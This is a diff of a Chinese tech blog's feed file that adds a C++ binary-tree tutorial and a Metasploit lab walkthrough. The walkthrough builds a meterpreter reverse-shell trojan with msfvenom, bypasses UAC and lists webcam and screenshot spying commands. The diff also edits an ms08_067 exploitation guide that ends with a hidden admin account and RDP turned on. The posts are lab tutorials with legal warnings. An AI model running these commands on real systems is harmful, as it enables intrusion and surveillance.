@@ -4,6 +4,60 @@
   
   
   <entry>
+    <title>二叉树的创建和遍历</title>
+    <link href="/2020/03/31/bin-tree1/"/>
+    <url>/2020/03/31/bin-tree1/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>套路，都是套路</p></blockquote><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>在计算机科学中，二叉树（英语：Binary tree）是每个节点最多只有两个分支（即不存在分支度大于2的节点）的树结构。通常分支被称作“左子树”或“右子树”。二叉树的分支具有左右次序，不能随意颠倒</p><blockquote><p>关于书上的那些性质和定义我就不写了，书上说的比我好多了。</p></blockquote><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>二叉树由数据，左子树，右子树组成，在C++中，通常用如下表示：</p><pre><code class="C++">typedef struct node {    node* lf; //左子树    node* rt; //右子树    int data; //数据}ndoe ,*bin_tree;</code></pre><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p>我们通常使用先根序创建一个二叉树</p><pre><code class="C++">void create(bin_tree&amp; a) {    int p;    cin&gt;&gt;p;    if (p == -1) {        a = NULL;    }    else {        a = new node;        a-&gt;data = p;        create(a-&gt;lf);        create(a-&gt;rt);    }}</code></pre><h2 id="四种遍历"><a href="#四种遍历" class="headerlink" title="四种遍历"></a>四种遍历</h2><p>我们常用的二叉树遍历方法有四种，先序，中序，后序和循环</p><p>我们来看一下先序中序和后序的递归表示</p><blockquote><p>循环遍历在之后的练习中有，因此不整理在这里了</p></blockquote><pre><code class="C++">//先序遍历，把顺序换一下有别样体验（中序，后序）void xxbl(bin_tree&amp; a) {    if (a) {        cout &lt;&lt; a-&gt;data;        xxbl(a-&gt;lf);        xxbl(a-&gt;rt);    }}//中序 void zxbl(bin_tree&amp; a) {    if (a) {        xxbl(a-&gt;lf);        cout &lt;&lt; a-&gt;data;        xxbl(a-&gt;rt);    }}//后序 void hxbl(bin_tree&amp; a) {    if (a) {        xxbl(a-&gt;lf);        xxbl(a-&gt;rt);        cout &lt;&lt; a-&gt;data;    }}</code></pre><h3 id="非递归"><a href="#非递归" class="headerlink" title="非递归"></a>非递归</h3><p>递归表示非常简单易懂，但是递归运算在运行很多层之后效率就会很低，为解决此问题，我们需要认识非递归的遍历方法，这里写一个前序非递归。</p><p>简单说一下思路，先用一个栈存储所有的左子树结点，然后抛出结点，并进入右结点，再次存储左结点，可以看出，这一思路可以代表根，左，右的先序思想。</p><pre><code class="C++">void preOrder(bin_tree &amp;root)     //非递归前序遍历 {    stack&lt;bin_tree&gt; s;    bin_tree p = root;    while (p != NULL || !s.empty())    {        while (p != NULL)        {            cout &lt;&lt; p-&gt;data &lt;&lt; &quot;&quot;;            s.push(p);            p = p-&gt;lf;        }        if (!s.empty())        {            p = s.top();            s.pop();            p = p-&gt;rt;        }    }}</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>数据结构与算法</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>C++</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>windows下提权实验</title>
+    <link href="/2020/03/29/dig3/"/>
+    <url>/2020/03/29/dig3/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>在我们获取对方电脑权限后，我们应该做什么（不要总是想到删库）</p></blockquote><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>kali linux攻击机（推荐kali20.1）</p><p>win 7 basic</p><h2 id="如何拿到权限"><a href="#如何拿到权限" class="headerlink" title="如何拿到权限"></a>如何拿到权限</h2><p>面对这样一台裸露的win7，我们有很多办法能拿到权限，比如著名的EternalBlue，这样可以直接拿到系统权限。</p><p>不过，我们还有更有意思的玩法，那就是反弹shell获取权限</p><p>首先，生成一个windows下运行的木马程序</p><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f exe -o 要生成的文件名</code></pre><p>启动http服务</p><pre><code class="bash">python -m SimpleHTTPServer 8080</code></pre><p>然后，进入msfconsole，使用模块handler，设置payload，这一部分操作在之前提到过，所以不详细说明了。</p><p>执行攻击，显示打开了监听</p><p>然后我们在浏览器输入本机ip和设置端口，看到了文件链接</p><p>我们打开win7虚拟机，也登陆这个ip，下载并运行文件</p><p>我们看到msf显示我们获取了权限</p><p>查看自己权限等级，发现为administrator，没获取到system等级，因此我们需要提权。</p><h3 id="不正常的拓展"><a href="#不正常的拓展" class="headerlink" title="不正常的拓展"></a>不正常的拓展</h3><blockquote><p>这一部分希望大家合理实验，不要利用此技术做违法的事情，技术无罪，心存敬畏</p></blockquote><p>危险操作：大家可能也发现了，我们这套操作是让目标在我们的内网端口下载这个文件，当然，我们可以用一个VPS让这个端口可以在外网访问，然后就可以实现钓鱼，这也就是很多木马软件的运行机制，只不过木马软件会捆绑在看似正常的软件背后。</p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><h3 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h3><p>UAC（User Account Control，用户账户控制）是Windows 7及后续Windows系统引入的一种安全功能，启用该功能后，在用户没有显示允许的情况下，即便是本地管理员账户也无法更改操作系统。我们经常看到桌面用户使用的是管理员账户（虽然不推荐，但这种做法已司空见惯），因此即使恶意软件掌握了本地管理员账户，想修改注册表中的某些信息，或者在系统中创建一个新的服务，UAC也会及时阻止这类行为。</p><p>后来研究人员找到了绕过该机制的方法，并且从Windows 7以来已经有许多方法可以绕过UAC。这种情况非常常见，以至于微软将这类问题当成“非优先”安全问题来处理。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>绕过也很简单，在kali使用下面的payload即可：</p><pre><code class="bash">use exploit/windows/local/bypassuac</code></pre><p>使用此代码，即可实现无弹窗uac绕过</p><h2 id="后面的工作"><a href="#后面的工作" class="headerlink" title="后面的工作"></a>后面的工作</h2><p>自此，我们已经拿到了系统权限，对面的机器对于我们来说将可以随意攻击，在meterpreter中有非常多的后渗透攻击方法可以使用，感兴趣的可以自己去查一下，这里推荐几个有意思的</p><pre><code class="bash">Screenshot //截图webcam_stram //直播webcam_snap //开启对方摄像头shell //进入shellrun Scraper //信息收集脚本</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透攻击实战</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>信息安全</tag>
+      
+      <tag>漏洞利用</tag>
+      
+      <tag>kali</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>关于链表的一些小练习</title>
     <link href="/2020/03/21/linklist4/"/>
     <url>/2020/03/21/linklist4/</url>
@@ -98,7 +152,7 @@
     <link href="/2020/03/10/dig2/"/>
     <url>/2020/03/10/dig2/</url>
     
-    <content type="html"><![CDATA[<blockquote><p>不要理会下面那句虎狼之词，继续搬运</p></blockquote><blockquote><p>我竟然把这个坑填下去了，可喜可贺。(填下去个锤子！from半年后的自己)</p></blockquote><h2 id="一切的开始"><a href="#一切的开始" class="headerlink" title="一切的开始"></a>一切的开始</h2><blockquote><p>刑法第二百八十六条违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役;后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。</p></blockquote><p>一定要清楚，我们做的是安全，一切的目的是更好的保护自己和他人。切记，切记！</p><h2 id="ms08-067"><a href="#ms08-067" class="headerlink" title="ms08_067"></a>ms08_067</h2><p>ms08_067是微软win操作系统中存在的一个服务器服务漏洞，在win server2008之前的系统都会受这个漏洞影响，黑客可以利用这个漏洞控制目标系统。</p><h2 id="操作概述"><a href="#操作概述" class="headerlink" title="操作概述"></a>操作概述</h2><p>使用kali linux攻击机对win xp系统利用此漏洞进行攻击，在靶机上建立管理员账号并远程控制靶机。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>kali linux攻击机（上一篇博客提到过）</p><p>win xp sp3 english（纯净版，不带任何补丁）</p><h2 id="控制靶机"><a href="#控制靶机" class="headerlink" title="控制靶机"></a>控制靶机</h2><p>进入kali终端，输入以下命令运行msf：</p><blockquote><p>msfconsole</p></blockquote><p>寻找并使用模块</p><p>我们要找的是ms08_067漏洞，所以我们首先寻找此漏洞</p><blockquote><p>search ms08_067_netapi</p></blockquote><p>我们找到漏洞后，使用此漏洞</p><blockquote><p>use exploit/windows/smb/ms08_067_netapi</p></blockquote><p>加载攻击载体</p><p>攻击载体有很多，我们这次使用shell_reverse_tcp（如果对渗透后攻击有想法的推荐Meterpreter）</p><blockquote><p>set payload generic/shell_reverse_tcp </p></blockquote><p>设置ip</p><p>LHOST为攻击机ip，RHOST为靶机ip，例如：</p><blockquote><p>set LHOST 192.168.1.62</p></blockquote><p>寻找对应版本target</p><p>target需要与靶机系统版本对应，在不确定版本时设置target为0也可自动选择</p><blockquote><p>set target 0</p></blockquote><p>运行</p><blockquote><p>exploit</p></blockquote><p>到此，我们就进入了靶机系统，你的kali Terminal应该显示以下信息。<br><a href="https://imgchr.com/i/8Progs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8Progs.md.png" srcset="/img/loading.gif" alt="8Progs.png" border="0" /></a></p><h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p>接下来，我们尝试在靶机上创建账户并使用远程桌面连接靶机，</p><p>首先，我们创建一个账户。</p><blockquote><p>user net host-name password /add</p></blockquote><p>提升为管理员权限</p><blockquote><p>net localgroup administrators host-name /add</p></blockquote><p>winxp远程操控端口为3389，我们将这个端口打开</p><blockquote><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p></blockquote><p>使用netstat查看端口</p><blockquote><p>netstat -an</p></blockquote><p>这时，我们会发现3389端口处于开启状态。</p><p>然后，我们可以用局域网内的计算机远程桌面连接到靶机，win10运行——&gt;MSTSC。</p><p>以上就是ms08_067漏洞利用复现的全过程。</p><h2 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h2><h3 id="访问445端口被拒绝"><a href="#访问445端口被拒绝" class="headerlink" title="访问445端口被拒绝"></a>访问445端口被拒绝</h3><p>装了445端口补丁的winxp将445端口停用，所以复现此例程时不要使用带补丁的win xp。</p><p>还有可能是因为靶机打开了防火墙，复现时需要将防火墙关闭。</p><h3 id="设置target"><a href="#设置target" class="headerlink" title="设置target"></a>设置target</h3><p>如果不设置target，将不会判断靶机的系统版本进行攻击。建议将target设置为0，target为0时会自动判断靶机系统版本攻击。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>winxp上的漏洞其实还有很多，感兴趣的同学可以查一下其他的漏洞并尝试复现，折腾永不停止！</p>]]></content>
+    <content type="html"><![CDATA[<blockquote><p>不要理会下面那句虎狼之词，继续搬运</p></blockquote><blockquote><p>我竟然把这个坑填下去了，可喜可贺。(填下去个锤子！from半年后的自己)</p></blockquote><h2 id="一切的开始"><a href="#一切的开始" class="headerlink" title="一切的开始"></a>一切的开始</h2><blockquote><p>刑法第二百八十六条违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役;后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。</p></blockquote><p>一定要清楚，我们做的是安全，一切的目的是更好的保护自己和他人。切记，切记！</p><h2 id="ms08-067"><a href="#ms08-067" class="headerlink" title="ms08_067"></a>ms08_067</h2><p>ms08_067是微软win操作系统中存在的一个服务器服务漏洞，在win server2008之前的系统都会受这个漏洞影响，黑客可以利用这个漏洞控制目标系统。</p><h2 id="操作概述"><a href="#操作概述" class="headerlink" title="操作概述"></a>操作概述</h2><p>使用kali linux攻击机对win xp系统利用此漏洞进行攻击，在靶机上建立管理员账号并远程控制靶机。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>kali linux攻击机（上一篇博客提到过）</p><p>win xp sp3 english（纯净版，不带任何补丁）</p><h2 id="控制靶机"><a href="#控制靶机" class="headerlink" title="控制靶机"></a>控制靶机</h2><p>进入kali终端，输入以下命令运行msf：</p><blockquote><p>msfconsole</p></blockquote><p>寻找并Ent使用模块</p><p>我们要找的是ms08_067漏洞，所以我们首先寻找此漏洞</p><blockquote><p>search ms08_067_netapi</p></blockquote><p>我们找到漏洞后，使用此漏洞</p><blockquote><p>use exploit/windows/smb/ms08_067_netapi</p></blockquote><p>加载攻击载体</p><p>攻击载体有很多，我们这次使用shell_reverse_tcp（如果对渗透后攻击有想法的推荐Meterpreter）</p><blockquote><p>set payload generic/shell_reverse_tcp </p></blockquote><p>设置ip</p><p>LHOST为攻击机ip，RHOST为靶机ip，例如：</p><blockquote><p>set LHOST 192.168.1.62</p></blockquote><p>寻找对应版本target</p><p>target需要与靶机系统版本对应，在不确定版本时设置target为0也可自动选择</p><blockquote><p>set target 0</p></blockquote><p>运行</p><blockquote><p>exploit</p></blockquote><p>到此，我们就进入了靶机系统，你的kali Terminal应该显示以下信息。<br><a href="https://imgchr.com/i/8Progs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8Progs.md.png" srcset="/img/loading.gif" alt="8Progs.png" border="0" /></a></p><h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p>接下来，我们尝试在靶机上创建账户并使用远程桌面连接靶机，</p><p>首先，我们创建一个账户。</p><blockquote><p>user net host-name password /add</p></blockquote><p>提升为管理员权限</p><blockquote><p>net localgroup administrators host-name /add</p></blockquote><p>winxp远程操控端口为3389，我们将这个端口打开</p><blockquote><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p></blockquote><p>使用netstat查看端口</p><blockquote><p>netstat -an</p></blockquote><p>这时，我们会发现3389端口处于开启状态。</p><p>然后，我们可以用局域网内的计算机远程桌面连接到靶机，win10运行——&gt;MSTSC。</p><p>以上就是ms08_067漏洞利用复现的全过程。</p><h2 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h2><h3 id="访问445端口被拒绝"><a href="#访问445端口被拒绝" class="headerlink" title="访问445端口被拒绝"></a>访问445端口被拒绝</h3><p>装了445端口补丁的winxp将445端口停用，所以复现此例程时不要使用带补丁的win xp。</p><p>还有可能是因为靶机打开了防火墙，复现时需要将防火墙关闭。</p><h3 id="设置target"><a href="#设置target" class="headerlink" title="设置target"></a>设置target</h3><p>如果不设置target，将不会判断靶机的系统版本进行攻击。建议将target设置为0，target为0时会自动判断靶机系统版本攻击。</p><h2 id="没过瘾？"><a href="#没过瘾？" class="headerlink" title="没过瘾？"></a>没过瘾？</h2><p>msf上有很多类似的漏洞攻击，如果没过瘾的话可以多google，多尝试，毕竟ms08_067过于古老，趣味性一般，想玩得更嗨的话我推荐ms17_010 EternalBlue（中文译名:永恒之蓝）</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>winxp上的漏洞其实还有很多，感兴趣的同学可以查一下其他的漏洞并尝试复现，折腾永不停止！</p>]]></content>
     
     
     <categories>
